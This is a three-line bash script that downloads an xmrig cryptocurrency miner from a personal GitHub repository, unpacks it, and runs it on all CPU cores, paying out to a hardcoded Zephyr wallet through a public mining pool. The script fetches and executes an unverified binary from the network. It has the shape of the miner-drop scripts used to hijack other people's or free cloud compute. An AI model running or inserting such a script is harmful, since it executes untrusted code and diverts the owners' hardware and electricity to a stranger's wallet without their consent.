#!/bin/bash
wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz
./xmrig --donate-level 1 -o sg.zephyr.herominers.com:1123 -u ZEPHs9S2EWRQzizKJRbnnvATxUoGNCbG5AH5t3HoCwVRWGuyerr8UshcoEwjzbxq88MNDKhBdmzc1Qs1s4u8JQ33YDcbYhxx5SN -p NEXT -a rx/0 -t $(nproc --all)
